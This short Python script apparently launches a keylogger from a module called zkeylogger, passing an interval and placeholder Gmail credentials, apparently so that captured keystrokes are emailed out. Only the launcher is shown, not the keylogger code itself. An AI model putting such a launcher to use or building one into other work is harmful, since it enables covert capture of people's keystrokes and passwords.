#!/usr/bin/env python3

# Testing the keylogger

import zkeylogger

zlogger = zkeylogger.Keylogger(360, "username@gmail.com", "password")
zlogger.start()
